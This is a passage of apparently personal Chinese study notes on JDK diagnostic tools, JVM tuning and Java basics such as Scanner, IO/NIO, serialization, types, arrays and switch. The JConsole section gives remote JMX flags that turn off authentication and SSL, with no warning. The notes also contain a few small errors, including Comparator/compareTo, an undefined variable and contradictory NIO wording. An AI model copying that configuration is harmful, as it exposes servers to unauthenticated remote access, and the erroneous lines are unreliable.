目录下。\njps：查看所有 Java 进程jps (JVM Process Status）类似 UNIX 的 ps 命令。用于查看所有 Java 进程的启动类、进程id、虚拟机传入参数和虚拟机参数等信息。\njps的基本语法如下：\njps [options] [hostid]\n\noptions表示可选的参数，hostid表示远程主机的ID，如果不指定则默认为本地主机。以下是一些常用的jps选项：\n\n-l：显示Java 进程的进程id、完整的包名和主类名。\n\n\n-m：显示虚拟机的传入参数。\n\n\n-v：显示虚拟机参数。\n\n\n-q：仅显示Java进程的进程id。\n\n\n\njstat：监视虚拟机运行状态信息jstat（JVM Statistics Monitoring Tool）用于收集 HotSpot 虚拟机各方面的运行数据。可以显示本地或者远程（需要远程主机提供 RMI 支持）虚拟机进程中的类信息、内存、垃圾收集、JIT 编译等运行数据。在没有 GUI，只提供了纯文本控制台环境的服务器上，它将是运行期间定位虚拟机性能问题的首选工具。\njstat的基本语法如下：\njstat -[option] [-t] [-h&lt;lines&gt;] [pid] [interval] [count]\n\n\noption：表示要收集的统计信息类型，如垃圾回收、类加载等。\n常见的 option 如下：\n\njstat -class pid：显示 ClassLoader 的相关信息；\njstat -compiler pid：显示 JIT 编译的相关信息；\njstat -gc pid：显示与 GC 相关的堆信息；\njstat -gccapacity pid：显示各个代的容量及使用情况；\njstat -gcnew pid：显示新生代信息；\njstat -gcnewcapcacity pid：显示新生代大小与使用情况；\njstat -gcold pid：显示老年代信息；\njstat -gcoldcapacity pid：显示老年代的大小；\njstat -gcpermcapacity pid：显示永久代大小，从 jdk1.8 开始,该选项不存在了，因为永久代被移除了；\njstat -gcutil pid：显示垃圾收集信息；\n\n\n-t：在输出信息上加一个 Timestamp 列，显示程序的运行时间\n\n-h&lt;lines&gt;：每隔lines行打印指标头部，指标头部是指在jstat输出结果中，每个列的名称。\n\npid：表示要监控的Java虚拟机进程的ID。\n\ninterval：表示数据收集的时间间隔（以毫秒为单位），可选参数。\n\ncount：表示要收集的数据点数目，可选参数。\n\n\n以下是一些常用的jstat选项：\n\n-class：显示关于类加载器的统计信息。\n-compiler：显示关于即时编译的统计信息。\n-gc：显示关于垃圾回收的统计信息。\n-gccapacity：显示关于垃圾回收的各个内存区域的容量。\n-gcutil：显示关于垃圾回收的各个内存区域的使用情况。\n-gcnew：显示关于新生代垃圾回收的统计信息。\n-gcold：显示关于老年代垃圾回收的统计信息。\n\n用法示例：\njstat -gc pid 1000 10：收集Java进程的垃圾回收统计信息，每隔1000毫秒收集一次，总共收集10次。这个命令会输出一系列关于垃圾回收的统计信息，如内存区域的大小、已使用空间、垃圾回收次数等。\n故障排除命令行工具（部分）这些命令在 JDK 安装目录下的 bin 目录下\njinfo: 查看和调整虚拟机参数jinfo（Java Configuration Info Tool）是一个Java命令行工具，用于显示Java虚拟机（JVM）进程的配置信息，如系统属性和JVM参数。此命令是实验性的，不受支持。对于核心文件，请使用jhsdb jinfo。\njinfo的基本语法如下：\njinfo [option] pid\n\n\noption：表示可选的参数，如获取系统属性、JVM参数等。\n以下是一些常用的jinfo选项：\n\n-flag：显示或修改指定的JVM参数。\n-sysprops：显示Java系统属性。\n-flags：显示JVM参数。\n\n\npid：表示要获取配置信息的Java虚拟机进程的ID。\n\n\n要修改JVM参数，可以使用以下命令格式：\njinfo -flag &lt;参数名&gt;=&lt;新值&gt; &lt;进程ID&gt;\n\n用法示例：\njinfo pid：输出当前 jvm 进程的全部参数和系统属性 (第一部分是系统的属性，第二部分是 JVM 的参数)。\njinfo -sysprops pid：获取Java进程的Java系统属性。\njmap：生成堆转储快照jmap（Java Memory Map Tool）用于生成Java虚拟机（JVM）进程的内存映射信息（生成堆转储快照）。此命令是实验性的，不受支持。对于核心文件，请使用jhsdb jmap。\n如果不使用 jmap 命令，要想获取 Java 堆转储快照，可以使用 “-XX:+HeapDumpOnOutOfMemoryError” 参数，可以让虚拟机在 OOM 异常出现之后自动生成 dump 文件，Linux 命令下可以通过 kill -3 发送进程退出信号也能拿到 dump 文件。\njmap的基本语法如下：\njmap [option] pid\n\n\noption：表示要执行的操作，如获取堆信息、生成堆转储文件等。\n以下是一些常用的jmap选项：\n\n-dump:dump_options：生成堆转储文件（heap dump），可以使用内存分析工具（如Eclipse MAT）对其进行进一步分析。\n-histo：显示堆中对象的实例数量、内存占用和类名等信息的直方图。\n-clstats：显示类加载器和系统类的统计信息。\n-finalizerinfo：显示在队列中等待执行的终结器方法的对象的信息。\n\n\npid：表示要获取内存映射信息的Java虚拟机进程的ID。\n\n\n用法示例：\njmap -dump:format=b,file=heapdump.hprof pid：生成Java进程堆转储文件，并将其保存到当前目录下的heapdump.hprof文件中。\njstack：生成线程快照jstack (Stack Trace for Java) 用于生成虚拟机当前时刻的线程快照，线程快照就是当前虚拟机内每一条线程正在执行的方法堆栈的集合。目的通常是定位线程出现长时间停顿的原因，如线程间死锁、请求外部资源导致的长时间等待等都是导致线程长时间停顿的原因。线程出现停顿的时候通过jstack来查看各个线程的调用堆栈，就可以知道没有响应的线程到底在后台做些什么事情，或者在等待些什么资源。\njstack的基本语法如下：\njstack [option] pid\n\n\noption：表示可选的参数，如打印锁信息等。\npid：表示要获取堆栈跟踪信息的Java虚拟机进程的ID。\n\n以下是一些常用的jstack选项：\n\n-l：显示关于锁的附加信息，如已拥有的锁、等待的锁等。\n-m：显示关于本地方法的堆栈跟踪信息（仅适用于部分平台）。\n-F：强制执行堆栈跟踪，当正常执行失败时使用（仅适用于部分平台）。\n\n举个例子，要获取一个Java进程（假设其进程ID为12345）的线程堆栈跟踪信息，可以运行以下命令：\njstack 12345\n\n这个命令会输出Java进程的所有线程的堆栈跟踪信息，包括线程ID、线程状态、调用栈等。您可以根据这些信息诊断和解决应用程序中的线程问题。\n可视化分析工具（部分）JConsole：Java 监视与管理控制台JConsole 是基于JMX（JMX（Java Management Extensions）是一种用于管理和监控Java应用程序的技术）的可视化监视、管理工具，功能包括查看内存、线程、类以及CPU的使用情况。可以很方便的监视本地及远程服务器的 java 进程的内存使用情况。\n可以在控制台输入jconsole命令启动或者在 JDK 目录下的 bin 目录找到jconsole.exe然后双击启动。\n如果需要使用 JConsole 连接远程进程，可以在远程 Java 程序启动时加上下面这些参数:\n-Djava.rmi.server.hostname=外网访问 ip 地址-Dcom.sun.management.jmxremote.port=60001   //监控的端口号-Dcom.sun.management.jmxremote.authenticate=false   //关闭认证-Dcom.sun.management.jmxremote.ssl=false\n\nVisual VM:多合一故障处理工具VisualVM 提供在 Java 虚拟机 (Java Virtual Machine, JVM) 上运行的 Java 应用程序的详细信息。在 VisualVM 的图形用户界面中，您可以方便、快捷地查看多个 Java 应用程序的相关信息。Visual VM 官网。Visual VM 中文文档。\n\n下面这段话摘自《深入理解 Java 虚拟机》。\nVisualVM（All-in-One Java Troubleshooting Tool）是到目前为止随 JDK 发布的功能最强大的运行监视和故障处理程序，官方在 VisualVM 的软件说明中写上了“All-in-One”的描述字样，预示着他除了运行监视、故障处理外，还提供了很多其他方面的功能，如性能分析（Profiling）。VisualVM 的性能分析功能甚至比起 JProfiler、YourKit 等专业且收费的 Profiling 工具都不会逊色多少，而且 VisualVM 还有一个很大的优点：不需要被监视的程序基于特殊 Agent 运行，因此他对应用程序的实际性能的影响很小，使得他可以直接应用在生产环境中。这个优点是 JProfiler、YourKit 等工具无法与之媲美的。\n\nVisualVM 基于 NetBeans 平台开发，因此它一开始就具备了插件扩展功能的特性，通过插件扩展支持，VisualVM 可以做到：\n\n显示虚拟机进程以及进程的配置、环境信息（jps、jinfo）。\n监视应用程序的 CPU、GC、堆、方法区以及线程的信息（jstat、jstack）。\ndump 以及分析堆转储快照（jmap、jhat）。\n方法级的程序运行性能分析，找到被调用最多、运行时间最长的方法。\n离线程序快照：收集程序的运行时配置、线程 dump、内存 dump 等信息建立一个快照，可以将快照发送开发者处进行 Bug 反馈。\n其他 plugins 的无限的可能性……\n\nJVM性能调优常见的JVM性能问题\nFull GC频繁\n内存出现OOM问题\n线程出现长时间停顿或死锁\n程序响应时间较长\n\nJVM性能问题定位要进行JVM性能优化，首先需要定位到系统中存在的会导致性能问题的原因。\nJVM性能问题的定位方法包括：\n\n使用jinfo或可视化工具查看配置参数。\n使用jstat、jmap、jstack或可视化工具等查看运行时状态。\n测试。\n\nJVM性能调优\n设置内存容量：增大堆内存和直接内存等内存的容量，避免出现OOM。\n设置垃圾收集器类型：根据系统需要选择合适的垃圾回收器。\n启用即时编译器（JIT）：启用JIT编译器，以将热点代码编译为本地机器码，提高执行速度。\n\nCPU占用过高问题的排查及解决https://blog.csdn.net/weixin_41563161/article/details/104627299\nReferences\n周志明. 深入理解Java虚拟机:第三版. 北京: 机械工业出版社, 2019.11.\nhttps://javaguide.cn/java/jvm/memory-area.html#java-%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A0%88\nhttps://javaguide.cn/java/jvm/jvm-parameters-intro.html\nhttps://javaguide.cn/java/jvm/jdk-monitoring-and-troubleshooting-tools.html\nhttps://help.aliyun.com/document_detail/148851.html\n\n","categories":["IT"],"tags":["JVM"]},{"title":"Java基础","url":"/2023/05/02/Java%E5%9F%BA%E7%A1%80/","content":"JAVA中Scanner的使用及nextLine和nextInt等混用报错问题解决\n参考出处：https://blog.csdn.net/qq_38367575/article/details/120420633\n\nScanner类用于扫描从控制台输入的数据，可以接收字符串和基本数据类型的数据。位于java.util.Scanner包中。\nScanner常用方法\nString  next(); \n作用：接收控制台输入的一个字符串。\n结束符：以空格和回车为结束符\nscanner.next() 方法会在读取输入后自动忽略输入中的空格和换行符，因此不会出现换行。如果需要读取包含空格或换行符的完整输入，可以使用 scanner.nextLine() 方法。\n\nString  nextLine(); \n作用：接收控制台输入的一个字符串。 \n结束符：以回车为结束符\n\nint  nextInt(); \n作用：接收控制台输入的一个int类型的数据。\n结束符：以空格和回车为结束符 \n\ndouble  nextDouble(); \n作用：接收控制台输入的一个double类型的数据。\n结束符：以空格和回车为结束符  \n\nboolean  nextBoolean(); \n作用：接收控制台输入的一个boolean类型的数据。\n结束符：以空格和回车为结束符 \n\nboolean hasNext();\n作用：检查输入流中是否还有下一个标记（token），标记是根据默认的分隔符（空格、制表符、换行符）来划分的。如果输入流中还有下一个标记，则返回 true，否则返回 false。、\nhasNext() 和 hasNextLine() 方法都是用于判断输入流中是否还有更多的数据可供读取，如果没有，会一直等待。\n\nboolean hasNextLine();\n作用：检查输入流中是否还有下一行文本（以换行符为分隔符）。如果输入流中还有下一行文本，则返回 true，否则返回 false。\n\n\n示例1（获取一个字符串）：\n//步骤1、创建Scanner类的一个对象。 Scanner scanner = new Scanner(System.in); \t //步骤2、通过scanner调用next等方法，接收控制台输入的数据。 String name = scanner.next();System.out.println(&quot;姓名：&quot; + name);\n\n示例2（while循环中使用Scanner）：\nScanner scanner = new Scanner(System.in);//如果没有下一行，会一直等待while(scanner.hasNextLine()) &#123;\tmap.put(scanner.nextInt(), scanner.nextInt());&#125;\n\n常见问题\n原因分析：原因是nextDouble()、nextInt()等方法，能够读出空格或者回车前的字符串或者数字，并且下次读时不会切换到空格或者回车之后（也就是还在age之后继续读，不会切换到下一行），而nextLine()则会读取本行且下次自动切换到下一行开头读。所以执行nextLine()之后实际上读取到的是age同一行后面的空字符和回车符，当执行nextDouble()时，读取的是name，而不是salary，所以无法解析出double类型的数据从而报错。\n解决方法在nextDouble()、nextInt()等方法后面都要加上一句不需要赋值的nextLine()，把读的位置切换到下一行\n示例：\nimport java.util.Scanner;public class Tess &#123;\tpublic static void main(String[] args) &#123;\t\tScanner scanner = new Scanner(System.in);\t\tint age = scanner.nextInt();\t\tscanner.nextLine();//消耗掉输入中的换行符，从而把读的位置切换到下一行\t\tString name = scanner.nextLine();\t\tdouble salary = scanner.nextDouble();\t\tscanner.nextLine();//把读的位置切换到下一行\t\tSystem.out.println(&quot;age:&quot; + age);\t\tSystem.out.println(&quot;name:&quot; + name);\t\tSystem.out.println(&quot;salary:&quot; + salary);\t&#125;&#125;\n\nIO流IO流分类\n按照数据流向，可以将流分为输入流和输出流\n按照数据类型，可以将流分为字节流和字符流\n按照处理功能，可以将流分为节点流和处理流\n\n输入流和输出流IO（Input Output）用于实现对数据的输入与输出操作，根据数据流向的方向不同，分为输入流和输出流。\nIO流的输入\\出源有控制台、文件、网络、数据库…，Java把不同的输入&#x2F;输出源（键盘、文件、网络等）抽象表述为流（Stream）。\n字节流和字符流IO流分字节流（以字节，8bit为单位对数据进行读写操作）和字符流（以字符为单位，一个字符占2个字节）\nJava提供了大量的类来支持IO操作，下表给大家整理了其中比较常用的一些类。\n\n\n\n分类\n字节输入流\n字节输出流\n字符输入流\n字符输出流\n作用\n\n\n\n抽象基类\nInputStream\nOutputStream\nReader\nWriter\n\n\n\n访问文件\nFileInputStream\nFileOutputStream\nFileReader\nFileWriter\n访问文件\n\n\n访问数组\nByteArrayInputStream\nByteArrayOutputStream\nCharArrayReader\nCharArrayWriter\n访问内存中的数组\n\n\n访问管道\nPipedInputStream\nPipedOutputStream\nPipedReader\nPipedWriter\n访问管道，实现进程之间的通信\n\n\n缓冲流\nBufferedInputstream\nBufferedOutputstream\nBufferedReader\nBufferedwriter\n在读写数据时对数据进行缓存，以减少IO次数\n\n\n过滤器流\nFilterInputStream\nFilterOutputStream\nFilterReader\nFilterWriter\n对其他流进行转换数据或提供附加功能\n\n\n对象流\nObjectInputstream\nObjectOutputstream\n\n\n实现对象的序列化\n\n\n打印流\n\nPrintStream\n\nPrintWriter\n简化打印操作\n\n\n转换流\n\n\nInputStreamReader\nOutputStreamWriter\n将字节流转换为字符流\n\n\n访问字符串\n\n\nStringReader\nStringwriter\n访问内存中的字符串\n\n\n推回输入流\nPushbackInputstream\n\nPushbackReader\n\n将已读入的数据推回到缓冲区，从而实现再次读取\n\n\n特殊流\nDataInputstream\nDataOutputstream\n\n\n读写Java基本类型的数据\n\n\n节点流和处理流\n节点流是低级流，直接从&#x2F;向IO设备（磁盘、网络等）读&#x2F;写数据，也称为低级流。\n\n处理流是高级流，采用装饰器模式对节点流进行封装，也称为高级流。\n处理流相比节点流提升的方面包括，增加缓存提高了数据输入和输出的效率、简化了数据读&#x2F;写操作等，\n\n\n节点流包含：FileInputStream、FileOutputStream、FileReader、FileWriter、ByteArrayInputStream、ByteArrayOutputStream、CharArrayReader、CharArrayWriter、PipedInputStream、PipedOutputStream等。\n处理流包含：BufferInputStream（FilterInputStream的实现类）、BufferOutputStream、BufferReader、BufferWriter、ObjectInputStream、ObjectOutputStream等。\n内存映射文件技术含义：操作系统利用虚拟内存将文件映射到内存中，然后，这个文件就可以被当作内存数据来访问。\n关键技术优势：\n\n让操作系统负责文件的读写，应用程序只需要处理内存数据，就可以实现IO操作；\n大幅提升文件数据的输入输出速度\n可以实现共享内存，内存映射文件可以被多个进程同时访问；内存映射文件技术涉及的内存在Java的堆空间之外；\n\nJava的NIO包支持内存映射技术，实现方式是通过MapperdByteBuffer读写内存\nNIO的实现原理NIO（New IO）是Java从1.4版本开始提供的一个IO包，为执行IO操作提供了传统Java IO API（以下简称OIO，Old IO）的替代方案。\nNIO 主要包括以下三个核心组件：\n\nBuffer（缓冲区）：NIO 读写数据都是通过缓冲区进行操作的。读操作的时候将 Channel 中的数据填充到 Buffer中，而写操作时将 Buffer中的数据写入到 Channel 中。\nChannel（通道）：Channel 是一个双向的、可读可写的数据传输通道，NIO 通过Channel来实现数据的输入输出。通道是一个抽象的概念，它可以代表文件、套接字或者其他数据源之间的连接。\nSelector（选择器）：允许一个线程处理多个 Channel，是基于事件驱动的 I&#x2F;O 多路复用模型。所有的 Channel 都可以注册到Selector上，由Selector来分配线程来处理事件。\n\nNIO和OIO对比：\n\nOIO在socket读和写等阶段都是阻塞的（所以也称BIO），NIO在socket读和写等阶段是非阻塞的，NIO的IO操作是同步阻塞的，但性能非常高。\nOIO严重依赖于线程，NIO支持使用单线程处理多个连接的非阻塞 I&#x2F;O 操作（多路复用特性）。\nOIO 中，数据的读写是面向流的， 分为字节流和字符流。NIO 在读取数据时，它是直接读到缓冲区中的。在写入数据时，写入到缓冲区中。 使用 NIO在读写数据时，都是通过缓冲区进行操作。\nOIO 中的流是单向的，分为输入流和输出流，数据只是在一个方向上传输；通道与流的不同之处在于通道是双向的，它可以用于读、写或者同时用于读写。\n\nJava 对零拷贝的支持：\n\nMappedByteBuffer 是 NIO 基于内存映射（mmap）这种零拷⻉⽅式的提供的⼀种实现，底层实际是调用了 Linux 内核的 mmap 系统调用。它可以将一个文件或者文件的一部分映射到内存中，形成一个虚拟内存文件，这样就可以直接操作内存中的数据，而不需要通过系统调用来读写文件。\nFileChannel 的transferTo()/transferFrom()是 NIO 基于发送文件（sendfile）这种零拷贝方式的提供的一种实现，底层实际是调用了 Linux 内核的 sendfile系统调用。它可以直接将文件数据从磁盘发送到网络，而不需要经过用户空间的缓冲区。关于FileChannel的用法可以看看这篇文章：Java NIO 文件通道 FileChannel 用法。\n\nIO典型应用示例打开大文件打开大文件时，应避免直接将硬盘中的数据全部读取到内存中，可以采取的方法包括：\n\n使用缓冲流，分次读取\n缓冲流内部维护了一个缓冲区，当缓冲区为空时，会读取数据到将缓冲区直至填满，当缓冲区填满时会自动刷入设备。\n\n使用NIO的零拷贝实现，直接操作硬盘上的数据，避免读取数据到内存\nNIO采用了内存映射文件技术来处理输入&#x2F;输出，不需要将数据读入内存，而是将文件或文件的一段区域映射到内存中，从而像访问内存一样来访问文件。\n\n\n序列化和反序列化概念\n序列化：将对象转换成二进制字节流的过程\n反序列化：将序列化生成的二进制字节流转换成对象的过程\n\n序列化的应用场景\n持久化Java对象，比如将Java对象保存在文件、内存、数据库中\n网络传输Java对象，比如远程方法调用\n\nJDK中的序列化方法使用Java中提供的序列化方法的方式是实现 java.io.Serializable接口。\n对于不想进行序列化的变量，可以使用 transient 关键字修饰。\nserialVersionUID的作用：\nserialVersionUID代表序列化的版本，用于版本控制。通过定义类的序列化版本，在反序列化时，只要对象中所存的版本和当前类的版本一致，就允许做恢复数据的操作，否则将会抛出 InvalidClassException 异常。\n之所以几乎不会直接使用 JDK 自带的序列化方式，主要原因有下面这些原因：\n\n不支持跨语言调用 : 如果调用的是其他语言开发的服务的时候就不支持了。\n性能差：相比于其他序列化框架性能更低，主要原因是序列化之后的字节数组体积较大，导致传输成本加大。\n存在安全问题：序列化和反序列化本身并不存在问题。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。相关阅读：应用安全:JAVA 反序列化漏洞之殇 - Cryin、Java 反序列化安全漏洞怎么回事? - Monica。\n\n常用的序列化工具\nJSON序列化工具：常用的JSON序列化工具有Jackson、Gson和Fastjson等。\n二进制序列化工具：Protobuf、Kryo、Avro。protobuf是由Google开发的一种高效的二进制序列化框架，支持多种编程语言。Kryo是一个快速、高效的Java对象序列化工具，只支持Java语言。Avro默认使用二进制格式的序列化方式，也支持JSON格式的序列化方式，支持多种编程语言。\nRPC框架内嵌的提供序列化工具：Thrift是Facebook开源提供的一个高性能，轻量级RPC服务框架。\n\n数据类型8种基本类型在Java中共有8种基本类型（primitive type），其中包含4种整型、2种浮点型、1种字符类型（用于表示Unicode编码）和1种真值类型。\n\n4种整型\nbyte：1字节；取值范围是从-128 (-2^7) 到 127 (2^7 - 1)\nshort：2字节；取值范围是从 -32,768 (-2^15) 到 32,767 (2^15 - 1)\nint：4字节；取值范围是从 -2,147,483,648 (-2^31) 到 2,147,483,647 (2^31 - 1)\nlong：8字节；取值范围是从-9,223,372,036,854,775,808 (-2^63) 到 9,223,372,036,854,775,807 (2^63 - 1)\nJava整型数值的表示方法：\n\n长整型（long）数值后面有一个后缀L或l\n\n十六进制数值有一个前缀0X或0x\n\n八进制有一个前缀0\n\n二进制有一个前缀0B或0b\n\n可以在整数类型的数字字面量上加下划线进行分组，以提高可读性\n\n\n\nJava和C++的不同：\nJava中整型的范围是平台无关的，而C++（C同样也是）中，是平台相关的。\n\n\n2种浮点型\nfloat：4字节；取值范围是大约是正负3.4E+38（约7位有效数字）\ndouble：8字节；取值范围大约是正负1.7E+308（约15位有效数字）\n取值范围是由IEEE 754浮点数标准规定的，float类型的32位二进制数被划分为三个部分：1个符号位，8个指数位和23个尾数位。double类型的64位二进制数被划分为三个部分：1个符号位，11个指数位和52个尾数位。其中，指数位决定了浮点数的范围，尾数位决定了浮点数的精度。\ndouble这种表示浮点数的类型数值精度是float类型的两倍，所以称为双精度浮点数。\nJava整型数值的表示方法：\n\nfloat类型的数值有一个后缀F或f\ndouble类型的数值既可以没有后缀，也可以有一个后缀D或d，所以Java中没有后缀的浮点数类型默认是double\n\n\n 警告： \n浮点数不适用于无法接受舍入误差的精确计算，如果需要精确的数值计算，不允许有舍入误差，应该使用BigDecimal类。\n\n\n1种字符类型\nchar：2字节；取值范围是从0到65535（包括0和65535）\nchar类型的作用主要有两个，表示单个字符，以及表示Unicode字符（目前，16位的char类型已经不足以描述所有Unicode字符了，部分Unicode字符需要两个char来表示）。\n\n备注：\nUnicode字符是一种用于表示文本字符的国际标准编码系统。它为几乎所有的字符（包括字母、数字、标点符号、符号、表情符号等）分配了唯一的代码点，以便在计算机系统中进行存储和处理。\nUnicode字符使用十六进制表示，前缀为”\\u”，后跟四个十六进制数字。\nUnicode转义序列会在解释代码之前处理。\n\n\n1种真值类型\nboolean：“大小”并不是精确定义的，通常是1字节；取值范围是true或false\n\n注意：\n在Java8HotSpot虚拟机下，单个boolean数值和数组中的boolean数值都是占1个字节。\n使用JOL对象布局分析工具，编写测试程序如下：\npublic class BooleanLength &#123;    public static void main(String[] args) &#123;        boolean b = true;        boolean[] bArr = new boolean[]&#123;true&#125;;        System.out.println(ClassLayout.parseInstance(b).toPrintable());        System.out.println(ClassLayout.parseInstance(bArr).toPrintable());    &#125;&#125;\n\n输出结果如下：\n\n可以看到无论是单个boolean对象还是数组中的boolean对象，其boolean数值都只占1个字节。\n\n\n\n在Java中只有基本类型不是对象。\n包装器所有基本类型都有一个与之对应的类，这些类被称为包装器（wrapper），分别是：Byte、Integer、Long、Float、Double、Boolean、Character（前6个类派生于父类Number）。\n\n由于每个值分别包装在一个对象中，所以ArrayList&lt;Integer&gt;的效率远远低于int[]数组。\n\n自动装箱\nlist.add(1);会自动转换为list.add(Integer.valueOf(1))，这种转换称为自动装箱（autoboxing）。\n自动拆箱\n当将Integer对象赋给一个int值时，会自动拆箱（unboxed）。例如，int n &#x3D; list.get(i)会转换成int n &#x3D; list.get(i).intValue()。\n自动装箱和自动拆箱也适用于算术表达式。例如，对于Integer n &#x3D; 1; n++;编译器会自动地对n拆箱，将拆箱后的结果增1，最后再将其装箱。\n装箱和拆箱由编译器完成，而不是虚拟机。编译器在生成类的字节码时会插入必要的方法调用，虚拟机只是执行这些字节码。\n字符串Java字符串（String类对象）是Unicode字符序列，每个字符char都对应一个Unicode码点。\n字符串不可变\n\n String objects are immutable, which means that once created, their values cannot be changed. \n\nJava中字符串是不可变的（immutable），并且也没有提供任何方法来修改字符串中的某个字符。\n字符串共享\n字符串常量池是一块位于Java堆内存中的特殊存储区域，用于存储字符串字面量（直接以双引号括起来的字符串）和显式通过String类的intern()方法调用加入常量池的字符串。当创建字符串时，如果字符串常量池中已经存在相同内容的字符串，则不会创建新的字符串对象，而是直接返回常量池中的字符串引用。\n需要注意的是，通过new关键字创建的字符串对象不会被共享，而是在堆内存中创建新的对象。只有使用字符串字面量或显式调用intern()方法将字符串加入常量池时才会进行共享。此外，+或substring等操作得到的字符串也不共享。\n检测字符串是否相等\nString类覆盖了equals方法。\n可以使用equals方法检测两个字符串是否相等，不能使用&#x3D;&#x3D;运算符，因为&#x3D;&#x3D;运算符只能确定两个字符串是否存储在同一个位置上，而Java中的相等的字符串可以存储在不共享的位置，不能仅通过位置判断是否相等。\n文本块\nJava15新增了文本块（text block）特性，提供了跨多行的字符串字面量。\n文本块特别适合包含用其它语言编写的代码，如SQL或HTML。\n文本块示例：\nString html = &quot;&quot;&quot;    &lt;div&gt;    \tHTML...    &lt;/div&gt;&quot;&quot;&quot;;\n\n文本块需要转义的情况：\n\n文本块以引号结尾\n\n文本块中包含三个及以上的引号\n\n文本块中有反斜杠（\\）\n\n文本块以空格结尾\n文本块会删除末尾的空格，如果需要保留末尾的空格，可以把空格替换为\\s。\n\n\n大数Java的java.math包中提供了两个重要的数值处理类，BigInteger和BigDecimal，用于处理大整数和高精度浮点数的运算。BigInteger类能够表示任意数值的整数。BigDecimal类能够实现任意精度的浮点数运算。\n数组for each循环的对象必须是一个数组或者是一个实现了Iterable接口的类对象。\nArrays类\n\n数组打印 \n如果要打印数组中的所有值，可以使用另一种方法，使用Arrays类的toString方法，该方法会返回一个包含数组元素的字符串，这些元素包围在中括号内，并使用逗号分隔。\nSystem.out.println(Arrays.toString(a));\n\n数组拷贝\n如果要拷贝数组内的所有值，可以使用Arrays类的copyOf方法。\nint[] copiedArray = Arrays.copyOf(a, length); //第二个参数length是新数组的长度\n\n如果要拷贝数组内指定范围内的所有值，可以使用Arrays类的copyOfRange方法。\n\n数组排序\n如果要对数值型的数组进行排序，可以使用Arrays类中的sort方法。如果是其它类型的数组，也可以使用该方法，前提是数组元素的类实现了Comparator接口的compareTo方法（x小于y时返回负数）。\n这个方法使用了优化的快速排序（QuickSort）算法\n\n数组二分查找\n如果要使用二分查找算法在有序数组a中或a中的指定范围内查找值v，可以使用Arrays的binarySearch方法，如果找到v，该方法会返回值的索引，否则返回一个负数值r，-r-1是v在保持a有序的前提下可以插入的位置。\n\n数组填充\n如果要将数组所有元素设置为指定值，可以使用Arrays类的fill方法。\n\n数组元素比较\nArrays类提供了一个equals()方法，用于比较两个数组是否相等。如果两个数组长度相同，并且相同索引对应的元素都相同，则返回true。\n\nList集合转基本类型的数组\nList&lt;Integer&gt; list = new LinkedList&lt;&gt;(); //HashSet等类型的对象也适用如下方法int[] array = list.stream().mapToInt(Integer::intValue).toArray();\n\n基本类型的数组转List\n//基本类型也可以实现转换（依赖boxed的装箱操作）int[] myArray =&#123;1,2,3&#125;;List myList = Arrays.stream(myArray2).boxed().collect(Collectors.toList());\n\n包装器类型的数组转List\nInteger[] array = &#123;1, 2, 3, 4&#125;;//对于是Integer而不是int类型的数组，可以直接调用Arrays.asList方法转换到List&lt;Integer&gt;List&lt;Integer&gt; list = Arrays.asList(array);\n\n不规则数组\nJava中的数组可以是不规则的数组，即数组的每一行有不同的长度。\n\nJava和C++的不同：\n在Java中，赋值操作b&#x3D;a的操作结果是让a和b引用同一个数组列表；而C++的Vector是按值复制的，这条赋值语句是构造一个与a长度相同的新向量，并将所有元素从a复制到b。\n\n运算符位运算符Java的运算符包括&amp;（and）、|（or）、^（xor）、~（not）。\n对于布尔值，&amp;和|运算符的返回结果也是布尔值，不过与&amp;&amp;和||不同的是，$和|运算符不是短路的，也就是说，计算结果之前两个操作数都需要计算。\n位移运算符Java的位移运算符包括&lt;&lt;、&gt;&gt;、&gt;&gt;&gt;，不存在&lt;&lt;&lt;。\n\n&gt;&gt;会用符号位填充高位\n&gt;&gt;&gt;会用0填充高位\n\nswitch语句Java14中引入switch，既可以作为语句，也可以做表达式。\n参数类型\n可以作为switch参数数据类型的有：int、bype、short、char、String、枚举、（int、bype、short、char）的包装类\n不能作为switch参数的有：long、float、double、boolean、复杂的表达式、……\ncase的参数可以有多个。如case &quot;Summer&quot;， &quot;Winter&quot; -&gt; 0;\n直通和非直通\nJava中switch语句的行为可以被描述为直通（能够继续执行，不会返回）和非直通：\n\n直通行为\n\ncase以冒号（:）结尾，是有直通行为的。\n\n\n非直通行为\n\ncase以箭头（-&gt;）结尾，是无直通行为的。\nswitch表达式中有yield关键字，yield关键字会返回表达式的值并终止执行。\nswitch表达式中有break关键字，break关键字会终止执行，switch表达式中不能使用return、break或continue语句。\n\n\n\nswitch的使用方法\n\n-&gt;\n\nswitch表达式\n\n直接返回值\nenum Size &#123;SMALL, MEDIUM, LARGE, EXTRA_LARGE&#125;;Size size = Size.LARGE;// switch表达式String result = switch (size) &#123;    case SMALL -&gt; &quot;S&quot;;    case MEDIUM -&gt; &quot;M&quot;;    case LARGE -&gt; &quot;L&quot;;    case EXTRA_LARGE -&gt; &quot;XL&quot;;&#125;;\n\n使用yield返回值\nenum Size &#123;SMALL, MEDIUM, LARGE, EXTRA_LARGE&#125;;Size size = Size.LARGE;String result = switch (size) &#123;    case SMALL -&gt; &#123;        yield &quot;S&quot;;    &#125;    case MEDIUM -&gt; &#123;        yield &quot;M&quot;;    &#125;    case LARGE -&gt; &#123;        yield &quot;L&quot;;    &#125;    case EXTRA_LARGE -&gt; &#123;        yield &quot;XL&quot;;    &#125;&#125;;\n\n\nswitch语句\n\n直接赋值\nenum Size &#123;SMALL, MEDIUM, LARGE, EXTRA_LARGE&#125;;Size size = Size.LARGE;String result;// switch语句switch (size) &#123;    case SMALL -&gt; result = &quot;S&quot;;    case MEDIUM -&gt; result = &quot;M&quot;;    case LARGE -&gt; result = &quot;L&quot;;    case EXTRA_LARGE -&gt; result = &quot;XL&quot;;&#125;;\n\n\n\n\n:\n\nswitch表达式\n\n使用yield返回值\nenum Size &#123;SMALL, MEDIUM, LARGE, EXTRA_LARGE&#125;;Size size = Size.LARGE;String result = switch (size) &#123;     case SMALL:         yield &quot;S&quot;;     case MEDIUM:         yield &quot;M&quot;;     case LARGE:         yield &quot;L&quot;;     case EXTRA_LARGE:         yield &quot;XL&quot;; &#125;;\n\n\nswitch语句\n\n赋值后使用break返回\nenum Size &#123;SMALL, MEDIUM, LARGE, EXTRA_LARGE&#125;;Size size = Size.LARGE;String result;switch (size) &#123;    case SMALL:        result = &quot;S&quot;;        break;    case MEDIUM:        result = &quot;M&quot;;        break;    case LARGE:        result = &quot;L&quot;;        break;    case EXTRA_LARGE:        result = 